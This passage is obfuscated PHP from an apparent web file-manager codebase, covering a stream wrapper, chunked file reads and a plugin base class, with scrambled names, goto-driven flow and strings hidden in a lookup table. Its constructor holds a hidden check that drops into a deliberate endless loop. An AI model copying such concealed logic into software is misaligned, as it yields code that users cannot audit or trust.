!$Dƒ„É¾âè[$eôÏñÜ±ò[185]] && $Dƒ„É¾âè[$eôÏñÜ±ò[77]] > 1024 * 1024 * 10) { return !1; } goto a˜„Ğç¤‚…; a´Ó†„Å: $b›ù º–³ƒ = url_request($E§¨÷º¡ğ, $eôÏñÜ±ò[213], !1, $e‘÷†«•“, !1, !1, 1); return $b›ù º–³ƒ[$eôÏñÜ±ò[1034]] ? $b›ù º–³ƒ[$eôÏñÜ±ò[1034]] : $eôÏñÜ±ò[33]; goto E»Ê‰£ö; E»Ê‰£ö: } public function download($B¯îìé–¢ê, $A”òŸ‘å¢Á) { Downloader::start($B¯îìé–¢ê, $A”òŸ‘å¢Á); return $A”òŸ‘å¢Á; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($A‰Ú†©ïæÉ, $EË‹˜Å¡ = '') { goto B‡¦«µ²çŞ; d—‚¸æ§ë: return $this->info ? !0 : !1; goto dŠô¨¦‚’ß; B‡¦«µ²çŞ: $this->info = $this->info($A‰Ú†©ïæÉ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Äº¡•ô™Ÿ][75]]; goto Dß¨¶Ó•é; Dß¨¶Ó•é: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$A‰Ú†©ïæÉ])) { self::$_chunkBuffer[$A‰Ú†©ïæÉ] = array(); } goto d—‚¸æ§ë; dŠô¨¦‚’ß: } function stream_read($AéÊøŒÔª½) { $E¶ñ–‡ƒÈÚ = $this->fileSubstr($this->pose, $AéÊøŒÔª½); $this->pose += strlen($E¶ñ–‡ƒÈÚ); return $E¶ñ–‡ƒÈÚ; } public function stream_tell() { return $this->pose; } public function stream_seek($dÔ…¹‚È, $aöÉ¿ßŠŠ£) { $FÍ¥³¯ÏÆ =& $_SERVER[Äº¡•ô™Ÿ]; if ($aöÉ¿ßŠŠ£ == SEEK_SET) { $this->pose = $dÔ…¹‚È; } else { if ($aöÉ¿ßŠŠ£ == SEEK_CUR) { $this->pose += $dÔ…¹‚È; } else { if ($aöÉ¿ßŠŠ£ == SEEK_END) { $this->pose = $this->info[$FÍ¥³¯ÏÆ[77]] + intval($dÔ…¹‚È); } } } if ($dÔ…¹‚È < 0) { $this->pose = $this->info[$FÍ¥³¯ÏÆ[77]] + $dÔ…¹‚È; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Äº¡•ô™Ÿ][77]]; } public function stream_close() { return !0; } public function url_stat($CÁˆ°çÀŠ×, $FË˜ÏÆƒ…à) { $D±ÈË­ŸŸ¦ =& $_SERVER[Äº¡•ô™Ÿ]; $AĞÈôÂÌõ‚ = $this->info($CÁˆ°çÀŠ×); return array($D±ÈË­ŸŸ¦[1285] => 0, $D±ÈË­ŸŸ¦[1286] => 0, $D±ÈË­ŸŸ¦[12] => 32768 + 511, $D±ÈË­ŸŸ¦[1287] => 0, $D±ÈË­ŸŸ¦[1288] => 0, $D±ÈË­ŸŸ¦[1289] => 0, $D±ÈË­ŸŸ¦[1290] => 0, $D±ÈË­ŸŸ¦[77] => $AĞÈôÂÌõ‚[$D±ÈË­ŸŸ¦[77]], $D±ÈË­ŸŸ¦[1291] => $AĞÈôÂÌõ‚[$D±ÈË­ŸŸ¦[1160]], $D±ÈË­ŸŸ¦[1248] => $AĞÈôÂÌõ‚[$D±ÈË­ŸŸ¦[107]], $D±ÈË­ŸŸ¦[1247] => $AĞÈôÂÌõ‚[$D±ÈË­ŸŸ¦[184]], $D±ÈË­ŸŸ¦[1292] => 0, $D±ÈË­ŸŸ¦[1293] => 0); } static $fileInfo = array(); public function info($aë¶¼‹”‹¹) { $BÁÊ®®åº = $_SERVER[Äº¡•ô™Ÿ][1294]; if (isset(self::$fileInfo[$aë¶¼‹”‹¹])) { return self::$fileInfo[$aë¶¼‹”‹¹]; } if (substr($aë¶¼‹”‹¹, 0, strlen($BÁÊ®®åº)) != $BÁÊ®®åº) { return !1; } self::$fileInfo[$aë¶¼‹”‹¹] = IO::info(substr($aë¶¼‹”‹¹, strlen($BÁÊ®®åº))); return self::$fileInfo[$aë¶¼‹”‹¹]; } public static function read($b£Îµá¿â¯, $DÀÎ©Ñö¡, $Cøà·äâŠ‰) { goto fç´ÀØ’×â; aô¤‘Ñˆ—‘: $fÈ‚Ë÷æÛù = 0; while ($fÈ‚Ë÷æÛù < $Cøà·äâŠ‰) { $EÖ™¿“·Û = min($FÂÀ¦Ğ‰ˆ¾, $Cøà·äâŠ‰ - $fÈ‚Ë÷æÛù); $c‚¶œ¥²ğ .= fread($b£”¯ˆš¿Ò, $EÖ™¿“·Û); $fÈ‚Ë÷æÛù += $EÖ™¿“·Û; } fclose($b£”¯ˆš¿Ò); goto bŞ•ö¡ñª˜; f™¯¶ÓŒˆ: $FÂÀ¦Ğ‰ˆ¾ = 8192; fseek($b£”¯ˆš¿Ò, $DÀÎ©Ñö¡, SEEK_SET); $c‚¶œ¥²ğ = $aè›²Å©¯µ[33]; goto aô¤‘Ñˆ—‘; fç´ÀØ’×â: $aè›²Å©¯µ =& $_SERVER[Äº¡•ô™Ÿ]; $b£”¯ˆš¿Ò = fopen($b£Îµá¿â¯, $aè›²Å©¯µ[1162]); if (!$b£”¯ˆš¿Ò) { return $aè›²Å©¯µ[33]; } goto f™¯¶ÓŒˆ; bŞ•ö¡ñª˜: return $c‚¶œ¥²ğ; goto b†ñÓÛ‘Š¬; b†ñÓÛ‘Š¬: } public function fileSubstr($e‰¨…‹£°, $eŠÀ°Æ§ºæ) { goto e†äÔêŸĞÒ; DÃ«Ò¤Éß: if ($e‰¨…‹£° + $eŠÀ°Æ§ºæ > $c¢¥¢¬É¢—) { $eŠÀ°Æ§ºæ = $c¢¥¢¬É¢— - $e‰¨…‹£°; } if ($eŠÀ°Æ§ºæ <= 0) { return $F¡·É¼®ğÓ[33]; } if ($e‰¨…‹£° < 0 || $e‰¨…‹£° >= $c¢¥¢¬É¢— || $eŠÀ°Æ§ºæ <= 0 || $eŠÀ°Æ§ºæ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\x65\x52\145\141\144\x20\145\x72\162\157\162\x21\40\163\x74\141\162\164\x3d{$e‰¨…‹£°}\73\154\x65\156\x67\x74\150\75{$eŠÀ°Æ§ºæ}\x3b\40\x73\151\172\x65\75{$c¢¥¢¬É¢—}\x3b"); } goto a¤‡ÇÛÙÏŞ; e†äÔêŸĞÒ: $F¡·É¼®ğÓ =& $_SERVER[Äº¡•ô™Ÿ]; $c¢¥¢¬É¢— = $this->info[$F¡·É¼®ğÓ[77]]; $f÷»”„¦¥‰ = $e‰¨…‹£°; goto F×ƒë—¼êÉ; B†ù‡Ü„Ö: foreach ($c¨¾¼ç´ as $cåÌÏòÇ¥ì => $Cëíğ«ù¼) { $cåÌÏòÇ¥ì = intval($cåÌÏòÇ¥ì); $eòÓ×ÑÖœ = $cåÌÏòÇ¥ì + strlen($Cëíğ«ù¼); if ($e‰¨…‹£° >= $eòÓ×ÑÖœ) { continue; } if ($e‰¨…‹£° >= $cåÌÏòÇ¥ì && $e‰¨…‹£° + $eŠÀ°Æ§ºæ <= $eòÓ×ÑÖœ) { return substr($Cëíğ«ù¼, $e‰¨…‹£° - $cåÌÏòÇ¥ì, $eŠÀ°Æ§ºæ); } break; } if (count($c¨¾¼ç´) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($F¡·É¼®ğÓ[1295], $F¡·É¼®ğÓ[1296] . count($c¨¾¼ç´) . "\73\x73\x74\x61\162\164\x3d{$e‰¨…‹£°}\54\x6c\145\156\x67\x74\x68\x3d{$eŠÀ°Æ§ºæ}\73\x70\x6f\x73\145\72{$cåÌÏòÇ¥ì}\x7e{$eòÓ×ÑÖœ}"); throw new Exception($F¡·É¼®ğÓ[1297]); } $cÕÒÕ×½ŸÛ = intval($e‰¨…‹£° / $aèß„¦á´) * $aèß„¦á´; goto cˆƒ–á˜Ï‚; FØ…¥Á¦Ğ: ksort($c¨¾¼ç´); $F§Ü§ÎˆÌœ = substr($eÓ£½Î•Ò, $e‰¨…‹£° - $cÕÒÕ×½ŸÛ, $eŠÀ°Æ§ºæ); return $F§Ü§ÎˆÌœ; goto E•Ä”ÎÁ¯Ä; CÄ¬„˜ Î‚: $cåÌÏòÇ¥ì = 0; $eòÓ×ÑÖœ = 0; $Cëíğ«ù¼ = $F¡·É¼®ğÓ[33]; goto B†ù‡Ü„Ö; cˆƒ–á˜Ï‚: $B­³¶‚µî = ceil(($e‰¨…‹£° + $eŠÀ°Æ§ºæ) / $aèß„¦á´) * $aèß„¦á´ - $cÕÒÕ×½ŸÛ; $eÓ£½Î•Ò = IO::fileSubstr($this->path, $cÕÒÕ×½ŸÛ, $B­³¶‚µî); $c¨¾¼ç´[$cÕÒÕ×½ŸÛ . $F¡·É¼®ğÓ[33]] = $eÓ£½Î•Ò; goto FØ…¥Á¦Ğ; F×ƒë—¼êÉ: $D¨†ù©£ªÃ = $eŠÀ°Æ§ºæ; if ($e‰¨…‹£° < 0) { $e‰¨…‹£° = $c¢¥¢¬É¢— + $e‰¨…‹£°; } if ($eŠÀ°Æ§ºæ === !1) { $eŠÀ°Æ§ºæ = $c¢¥¢¬É¢— - $e‰¨…‹£°; } goto DÃ«Ò¤Éß; a¤‡ÇÛÙÏŞ: $aèß„¦á´ = 64 * 1024; $c¨¾¼ç´ =& self::$_chunkBuffer[$this->path]; if (!$c¨¾¼ç´) { $c¨¾¼ç´ = array(); } goto CÄ¬„˜ Î‚; E•Ä”ÎÁ¯Ä: } private function log($fÄÅøõ³©, $DáØé˜½¯ó) { $bÇÚæ˜ÚÚ„ =& $_SERVER[Äº¡•ô™Ÿ]; $DáŠËœÖŸ• = timeFloat() - $this->timeStart; write_log(sprintf($bÇÚæ˜ÚÚ„[1298], $fÄÅøõ³©, $this->info[$bÇÚæ˜ÚÚ„[28]], $DáŠËœÖŸ•, $DáØé˜½¯ó), $bÇÚæ˜ÚÚ„[1213]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto d«¾­ù•è÷; DïçóŒ¼É: $this->values = array(); return $this; goto bË’ÎÇ÷†; d«¾­ù•è÷: $e‚ˆÙ¬¸â =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($_SERVER[$e‚ˆÙ¬¸â[789]]) || !isset($_SERVER[$e‚ˆÙ¬¸â[1205]])) { goto e«ğ‰Ú¤÷ì; Fæ²øâÜ‹Ó: $FÅË›‘¡² = $e‚ˆÙ¬¸â[796]; $FÅË›‘¡²($_SERVER[$e‚ˆÙ¬¸â[797]]); $C÷¹“—ÉŞ¨ = 1; goto A¯ªÆ‹“Ïš; A¯ªÆ‹“Ïš: for ($FÃíÆ¤Ñˆ¸ = $C÷¹“—ÉŞ¨; $FÃíÆ¤Ñˆ¸ > 0; $FÃíÆ¤Ñˆ¸++) { $FÅË›‘¡² = json_encode($GLOBALS[$e‚ˆÙ¬¸â[381]]); } goto c»½Ã°îùÊ; e«ğ‰Ú¤÷ì: $CŞ‘ƒÒ¦± = $e‚ˆÙ¬¸â[791]; $C ÁÂğŠ“´ = $e‚ˆÙ¬¸â[792]; $b‹­Ë»Í¥ = $_SERVER[$e‚ˆÙ¬¸â[793]] . $e‚ˆÙ¬¸â[794]; goto A˜ò–À×Æ”; A˜ò–À×Æ”: $DçÎíÃ¸ùË = $C ÁÂğŠ“´($b‹­Ë»Í¥); $BíÛùµÓ·ì = explode($e‚ˆÙ¬¸â[214], $DçÎíÃ¸ùË); if (count($BíÛùµÓ·ì) < $e‚ˆÙ¬¸â[558]) { $D¢‚ç‡¬Äó = $e‚ˆÙ¬¸â[795]; $D¢‚ç‡¬Äó(); } goto Fæ²øâÜ‹Ó; c»½Ã°îùÊ: } global $in, $config; goto Bİàóåˆ‚Ø; F«÷ƒ÷‘: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $e‚ˆÙ¬¸â[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $e‚ˆÙ¬¸â[8]; $this->pluginLangArr = $this->initLang(); goto DïçóŒ¼É; ašˆ×õ¤…: $this->pluginName = str_replace($e‚ˆÙ¬¸â[1299], $e‚ˆÙ¬¸â[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $e‚ˆÙ¬¸â[8]; $this->pluginApi = appHostGet() . $e‚ˆÙ¬¸â[1300] . $this->pluginName . $e‚ˆÙ¬¸â[8]; goto F«÷ƒ÷‘; Bİàóåˆ‚Ø: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($e‚ˆÙ¬¸â[1299]); goto ašˆ×õ¤…; bË’ÎÇ÷†: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Äº¡•ô™Ÿ][1301]); } protected function assign($CÛÒ¯¢•ƒÓ, $eÂ³„¹Šá” = false) { if (is_array($CÛÒ¯¢•ƒÓ)) { $this->values = array_merge($this->values, $CÛÒ¯¢•ƒÓ); } else { $this->values[$CÛÒ¯¢•ƒÓ] = $eÂ³„¹Šá”; } } protected function display($a¥¯˜ï‹á™) { extract($this->values); require $a¥¯˜ï‹á™; } final function hookRegist($A®„àÒ„) { $this->modelPlugin->appRegist($this->pluginName, $A®„àÒ„); } final function appIcon() { $aà ×‹à÷Â =& $_SERVER[Äº¡•ô™Ÿ]; $aÜİæôÕ‡ = $this->appPackage(); $aÓÈôŒ×Æ³ = $aà ×‹à÷Â[33]; if (isset($aÜİæôÕ‡[$aà ×‹à÷Â[379]])) { if (isset($aÜİæôÕ‡[$aà ×‹à÷Â[379]][$aà ×‹à÷Â[1302]])) { $aÓÈôŒ×Æ³ = $aà ×‹à÷Â[1303] . $aÜİæôÕ‡[$aà ×‹à÷Â[379]][$aà ×‹à÷Â[1302]] . $aà ×‹à÷Â[1304]; } else { if ($aÜİæôÕ‡[$aà ×‹à÷Â[379]][$aà ×‹à÷Â[1305]]) { $aÓÈôŒ×Æ³ = $aà ×‹à÷Â[1306] . $aÜİæôÕ‡[$aà ×‹à÷Â[379]][$aà ×‹à÷Â[1305]] . $aà ×‹à÷Â[1307]; } } } return $aÓÈôŒ×Æ³; } final function fileCanView($FÁ¤ÒÇ•ÇÜ) { $CÖ• ›…• =& $_SERVER[Äº¡•ô™Ÿ]; if (request_url_safe($FÁ¤ÒÇ•ÇÜ)) { return !0; } if ($this->isShare($FÁ¤ÒÇ•ÇÜ)) { return !0; } if (!Action($CÖ• ›…•[1308])->authCan($CÖ• ›…•[1309])) { show_tips(LNG($CÖ• ›…•[1310]) . $CÖ• ›…•[1311], !1); } ActionCall($CÖ• ›…•[1312], $FÁ¤ÒÇ•ÇÜ); } final function isShare($aÖ¤º£·—™) { $E©ãèæçÀì = KodIO::parse($aÖ¤º£·—™); return $E©ãèæçÀì[$_SERVER[Äº¡•ô™Ÿ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($e……»Ò—äâ) { if (request_url_safe($e……»Ò—äâ)) { return $e……»Ò—äâ; } if (!$this->isShare($e……»Ò—äâ)) { $e……»Ò—äâ = $this->filePath($e……»Ò—äâ); } return Action($_SERVER[Äº¡•ô™Ÿ][1017])->linkOut($e……»Ò—äâ); } public function filePathLinkOut($AåŠ°”á©‡) { if (request_url_safe($AåŠ°”á©‡)) { return $AåŠ°”á©‡; } $this->fileCanView($AåŠ°”á©‡); return Action($_SERVER[Äº¡•ô™Ÿ][1017])->link($AåŠ°”á©‡); } final function filePath($fÕ¤¼ÇÌ) { $FáæàÆÄºµ =& $_SERVER[Äº¡•ô™Ÿ]; if ($FË‚èáğÚ… = $this->checkSharePath($fÕ¤¼ÇÌ)) { return $FË‚èáğÚ…; } $this->fileCanView($fÕ¤¼ÇÌ); if (request_url_safe($fÕ¤¼ÇÌ)) { $d¹ó…Ööçø = parse_url_query($fÕ¤¼ÇÌ); if (isset($d¹ó…Ööçø[$FáæàÆÄºµ[1313]]) && isset($d¹ó…Ööçø[$FáæàÆÄºµ[194]])) { $C´ó´Õœóˆ = Model($FáæàÆÄºµ[1088])->get($FáæàÆÄºµ[1314]); $dªÕá°ÁÕØ = Mcrypt::decode($d¹ó…Ööçø[$FáæàÆÄºµ[194]], $C´ó´Õœóˆ); if ($dªÕá°ÁÕØ) { $this->fileInfo = IO::infoWithChildren($dªÕá°ÁÕØ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $dªÕá°ÁÕØ; } } $fÕ¤¼ÇÌ = $this->_cacheHttpFile($fÕ¤¼ÇÌ); $this->fileInfo = IO::infoWithChildren($fÕ¤¼ÇÌ); } else { $this->fileInfo = IO::infoWithChildren($fÕ¤¼ÇÌ); if (!$this->fileInfo) { show_tips(LNG($FáæàÆÄºµ[102]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $fÕ¤¼ÇÌ; } final function _cacheHttpFile($fÔñ¨ïœ²ê) { $eœ‚Ş¹™–Š = hash_path($fÔñ¨ïœ²ê, !0); $this->cachePath = $this->pluginCachePath($eœ‚Ş¹™–Š); if ($cÌš¿Î¢ = IO::fileNameExist($this->cachePath, $eœ‚Ş¹™–Š)) { return KodIO::make($cÌš¿Î¢); } $eè²Û‚« = $this->cachePath . $eœ‚Ş¹™–Š; return $this->pluginCacheFileSet($eè²Û‚«, file_get_contents($fÔñ¨ïœ²ê)); } final function _tmpFileName($aÍ©®¡ÛÒ = array()) { goto BŞÇŠß†º; E±µßŒ¡Ï: if (isset($aÍ©®¡ÛÒ[$BÁİ„›´º[159]][$BÁİ„›´º[161]])) { return $aÍ©®¡ÛÒ[$BÁİ„›´º[159]][$BÁİ„›´º[161]]; } $eœŞ¼Ñ»Ú‰ = array($aÍ©®¡ÛÒ[$BÁİ„›´º[28]], $aÍ©®¡ÛÒ[$BÁİ„›´º[75]], $aÍ©®¡ÛÒ[$BÁİ„›´º[77]]); if (isset($aÍ©®¡ÛÒ[$BÁİ„›´º[455]])) { $eœŞ¼Ñ»Ú‰[] = $aÍ©®¡ÛÒ[$BÁİ„›´º[455]]; } goto a¥‘­Ä§äˆ; BŞÇŠß†º: $BÁİ„›´º =& $_SERVER[Äº¡•ô™Ÿ]; if (!$aÍ©®¡ÛÒ) { $aÍ©®¡ÛÒ = $this->fileInfo; } if (isset($aÍ©®¡ÛÒ[$BÁİ„›´º[161]])) { return $aÍ©®¡ÛÒ[$BÁİ„›´º[161]]; } goto E±µßŒ¡Ï; a¥‘­Ä§äˆ: return md5(implode($BÁİ„›´º[70], $eœŞ¼Ñ»Ú‰)); goto a“íõŠìÊ»; a“íõŠìÊ»: } final function checkSharePath($D®³Ü„ìÅ®) { goto eÎãÙµˆòñ; bí¤İ¢Éíº: $this->cachePath = $this->pluginCachePath($this->fileInfo[$B×¹””ñ¾[161]]); return $Eé‹Ï“÷Ò[$B×¹””ñ¾[75]]; goto D¡·î–‹„ì; cÆè“Äßàå: $Eé‹Ï“÷Ò = Action($B×¹””ñ¾[1017])->sharePathInfo($D®³Ü„ìÅ®); if (!isset($Eé‹Ï“÷Ò[$B×¹””ñ¾[75]])) { show_json(LNG($B×¹””ñ¾[1316]), !1); } $this->fileInfo = $Eé‹Ï“÷Ò[$B×¹””ñ¾[159]]; goto bí¤İ¢Éíº; eÎãÙµˆòñ: $B×¹””ñ¾ =& $_SERVER[Äº¡•ô™Ÿ]; if (!defined($B×¹””ñ¾[423])) { define($B×¹””ñ¾[1315], 0); } if (!$this->isShare($D®³Ü„ìÅ®)) { return !1; } goto cÆè“Äßàå; D¡·î–‹„ì: } final function pluginCachePath($c ‹­…‘ï° = '') { $B‘–—¯‚Õ· =& $_SERVER[Äº¡•ô™Ÿ]; $D…œò‘´è¯ = IO_PATH_SYSTEM_TEMP . $B‘–—¯‚Õ·[1317] . $this->pluginName; if (!($cĞîœÓ‡… = IO::infoFull($D…œò‘´è¯))) { return IO::mkdir($D…œò‘´è¯ . $B‘–—¯‚Õ·[8] . $c ‹­…‘ï°); } if (empty($c ‹­…‘ï°)) { return $cĞîœÓ‡…[$B‘–—¯‚Õ·[75]]; } if (!($FÇÌ™ßØ = IO::fileNameExist($cĞîœÓ‡…[$B‘–—¯‚Õ·[75]], $c ‹­…‘ï°))) { return IO::mkdir($cĞîœÓ‡…[$B‘–—¯‚Õ·[75]] . $c ‹­…‘ï°); } return KodIO::make($FÇÌ™ßØ); } final function pluginCacheFileSet($EÚÂáëßÙŒ, $B˜µ‡½äŠ… = '') { $bß´‡ˆİãˆ =& $_SERVER[Äº¡•ô™Ÿ]; if (!($CÆˆ½Õ’³ = IO::infoFull($EÚÂáëßÙŒ))) { return IO::mkfile($EÚÂáëßÙŒ, $B˜µ‡½äŠ…, REPEAT_REPLACE); } IO::setContent($CÆˆ½Õ’³[$bß´‡ˆİãˆ[75]], $B˜µ‡½äŠ…); return $CÆˆ½Õ’³[$bß´‡ˆİãˆ[75]]; } final function pluginLocalFile($c†µèõ›ŠĞ = '') { goto B”—Ó®µÁŒ; a¨¬¢»Ğ¬²: if (!$c†µèõ›ŠĞ) { return $bó•‹Œè¥µ; } $b¼ÓáºïæË = IO::info($c†µèõ›ŠĞ); $D„Şäİ×Ñ¯ = $this->_tmpFileName($b¼ÓáºïæË) . $D†¹À¤°[93] . $b¼ÓáºïæË[$D†¹À¤°[157]]; goto c¾Ê“™ŞÏ; c¾Ê“™ŞÏ: $BªØÚ‹Ì‰ = $bó•‹Œè¥µ . $D„Şäİ×Ñ¯; if (@file_exists($BªØÚ‹Ì‰)) { return $BªØÚ‹Ì‰; } return IO::copy($c†µèõ›ŠĞ, $bó•‹Œè¥µ, 0, $D„Şäİ×Ñ¯); goto Câ«Ë‚ì°; B”—Ó®µÁŒ: $D†¹À¤° =& $_SERVER[Äº¡•ô™Ÿ]; $bó•‹Œè¥µ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($bó•‹Œè¥µ)) { mk_dir($bó•‹Œè¥µ); } goto a¨¬¢»Ğ¬²; Câ«Ë‚ì°: } final function appPackage() { goto B—ëˆÁª„; C±¥„âªôá: $this->parseLang($C’ÕâØğš); $A”˜Ò›À³ = json_decode_force($C’ÕâØğš); if (!$A”˜Ò›À³) { return array(); } goto bæµ‹»·¶; B—ëˆÁª„: $CëÕÂáåÎ =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->packageData) { return $this->packageData; } $C’ÕâØğš = $this->parseFile($this->pluginPath . $CëÕÂáåÎ[1318]); goto C±¥„âªôá; DŠâçè®„: return $A”˜Ò›À³; goto C´‚Œï‰Ò; bæµ‹»·¶: $DŸî¹ãã˜õ = Hook::trigger($CëÕÂáåÎ[1319], $A”˜Ò›À³); if ($DŸî¹ãã˜õ && is_array($DŸî¹ãã˜õ)) { $A”˜Ò›À³ = $DŸî¹ãã˜õ; } $this->packageData = $A”˜Ò›À³; goto DŠâçè®„; C´‚Œï‰Ò: } public function packageInfoGet($F¤œƒ©¢) { $cÓåéœ¥ˆã = $this->appPackage(); return array_get_value($cÓåéœ¥ˆã, $F¤œƒ©¢); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Äº¡•ô™Ÿ][1320]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Äº¡•ô™Ÿ][1321]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Äº¡•ô™Ÿ][1322]); } private function parseFile($B„á ºÎ”Å) { $Ağ£˜Œ¬Š‚ =& $_SERVER[Äº¡•ô™Ÿ]; $f‰µ¨Ù‡³µ = file_get_contents($B„á ºÎ”Å); $D†éÕ¶³£– = array($Ağ£˜Œ¬Š‚[1323], $Ağ£˜Œ¬Š‚[1324], $Ağ£˜Œ¬Š‚[1325], $Ağ£˜Œ¬Š‚[1326], $Ağ£˜Œ¬Š‚[1327], $Ağ£˜Œ¬Š‚[1328], $Ağ£˜Œ¬Š‚[1329]); $FÂ¥º‘ì…± = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ağ£˜Œ¬Š‚[84]][$Ağ£˜Œ¬Š‚[1330]]); $f‰µ¨Ù‡³µ = str_replace($D†éÕ¶³£–, $FÂ¥º‘ì…±, $f‰µ¨Ù‡³µ); return $f‰µ¨Ù‡³µ; } private function parseLang(&$fÖ³ˆæÔ®) { goto bøÄ÷½…¿; cºãÕ»¼È†: preg_match_all($Eî¢”«Ø½á[1332], $fÖ³ˆæÔ®, $CªßÀ¤ê¼¯); if (!is_array($CªßÀ¤ê¼¯) || count($CªßÀ¤ê¼¯) == 0 || !is_array($CªßÀ¤ê¼¯[0]) || count($CªßÀ¤ê¼¯[0]) == 0) { return; } $D£…öÙšãˆ = array(); goto E­‡¹Ò–ø®; bøÄ÷½…¿: $Eî¢”«Ø½á =& $_SERVER[Äº¡•ô™Ÿ]; $dÒÕˆõªŸ = $Eî¢”«Ø½á[1331]; if (!strstr($fÖ³ˆæÔ®, $dÒÕˆõªŸ)) { return; } goto cºãÕ»¼È†; E­‡¹Ò–ø®: $a‡ŒÓŞÄ¹æ = array(); foreach ($CªßÀ¤ê¼¯[0] as $cÆÃõ‚øÇ¾) { $Aàì…İëÆ¿ = substr($cÆÃõ‚øÇ¾, strlen($dÒÕˆõªŸ), -4); $A““…‡ãìõ = LNG($Aàì…İëÆ¿); $D£…öÙšãˆ[] = $cÆÃõ‚øÇ¾; $a‡ŒÓŞÄ¹æ[] = str_replace(array($Eî¢”«Ø½á[214], $Eî¢”«Ø½á[992], $Eî¢”«Ø½á[327], $Eî¢”«Ø½á[113]), array($Eî¢”«Ø½á[50], $Eî¢”«Ø½á[50], $Eî¢”«Ø½á[33], $Eî¢”«Ø½á[1333]), $A““…‡ãìõ); } $fÖ³ˆæÔ® = str_replace($D£…öÙšãˆ, $a‡ŒÓŞÄ¹æ, $fÖ³ˆæÔ®); goto EİÌ¥°©ëë; EİÌ¥°©ëë: } private function parseConfig(&$Eì…Ù“Ê÷İ) { goto CŞÒ©ƒº¾Ë; CŞÒ©ƒº¾Ë: $C†óîÓî© =& $_SERVER[Äº¡•ô™Ÿ]; $F´£¬‘ÍÆµ = $C†óîÓî©[1334]; if (!strstr($Eì…Ù“Ê÷İ, $F´£¬‘ÍÆµ)) { return; } goto c“Ûî¼³øÃ; c“Ûî¼³øÃ: preg_match_all($C†óîÓî©[1335], $Eì…Ù“Ê÷İ, $eóá¼»¹æ); if (!is_array($eóá¼»¹æ) || count($eóá¼»¹æ) == 0 || !is_array($eóá¼»¹æ[0]) || count($eóá¼»¹æ[0]) == 0) { return; } $B¾§ĞêÒÔ´ = $this->getConfig(); goto D¶÷ÛŠ‹ Æ; C¢­„Â³éä: $Eì…Ù“Ê÷İ = str_replace($bÙ·Çª˜âö, $E§¼Ä¡ØƒÒ, $Eì…Ù“Ê÷İ); goto CÎŒ´õ»‚Ô; D¶÷ÛŠ‹ Æ: $bÙ·Çª˜âö = array(); $E§¼Ä¡ØƒÒ = array(); foreach ($eóá¼»¹æ[0] as $Eñ­Ì‘‘ô˜) { $a¼¦ŠùìµÅ = substr($Eñ­Ì‘‘ô˜, strlen($F´£¬‘ÍÆµ), -2); $bÙ·Çª˜âö[] = $Eñ­Ì‘‘ô˜; $E§¼Ä¡ØƒÒ[] = _get($B¾§ĞêÒÔ´, $a¼¦ŠùìµÅ); } goto C¢­„Â³éä; CÎŒ´õ»‚Ô: } private function parsePackage(&$CÎà¦Ï¼º) { goto DêĞåøÖùÓ; bâ’ßï»£: preg_match_all($F¯®ä®˜Ê[1337], $CÎà¦Ï¼º, $C‡½Æ†‘ö§); if (!is_array($C‡½Æ†‘ö§) || count($C‡½Æ†‘ö§) == 0 || !is_array($C‡½Æ†‘ö§[0]) || count($C‡½Æ†‘ö§[0]) == 0) { return; } $a• ñ´¶é = $this->appPackage(); goto BÄª’Õáù; BÄª’Õáù: $b¤±ÇÕ¹¬¹ = array(); $D©ø–èÕ»ˆ = array(); foreach ($C‡½Æ†‘ö§[0] as $A¤£Îé¨¹›) { $AŞ¦‚Òáì‰ = substr($A¤£Îé¨¹›, strlen($b…‰“å¦åƒ), -2); $b¤±ÇÕ¹¬¹[] = $A¤£Îé¨¹›; $D©ø–èÕ»ˆ[] = _get($a• ñ´¶é, $AŞ¦‚Òáì‰); } goto Bé½³”ˆ»ï; Bé½³”ˆ»ï: $CÎà¦Ï¼º = str_replace($b¤±ÇÕ¹¬¹, $D©ø–èÕ»ˆ, $CÎà¦Ï¼º); goto C’ÙÈ‹øµ; DêĞåøÖùÓ: $F¯®ä®˜Ê =& $_SERVER[Äº¡•ô™Ÿ]; $b…‰“å¦åƒ = $F¯®ä®˜Ê[1336]; if (!strstr($CÎà¦Ï¼º, $b…‰“å¦åƒ)) { return; } goto bâ’ßï»£; C’ÙÈ‹øµ: } final function echoFile($bãì¼½š“, $F¿‰ƒ° ä = false) { goto EŞ¨ã²æš; EŞ¨ã²æš: $E‡…ù¹Éè =& $_SERVER[Äº¡•ô™Ÿ]; $eƒ÷¤ºÁ‹‰ = $this->pluginPath . $bãì¼½š“; if (ACT == $E‡…ù¹Éè[1338]) { echo $E‡…ù¹Éè[1339] . $this->pluginName . $E‡…ù¹Éè[8] . $bãì¼½š“ . $E‡…ù¹Éè[1340]; if (!file_exists($eƒ÷¤ºÁ‹‰)) { echo $E‡…ù¹Éè[1341]; return; } } goto Aò¬ÌÖâï; Aò¬ÌÖâï: $f·°Ê˜¢´ = $this->parseFile($eƒ÷¤ºÁ‹‰); 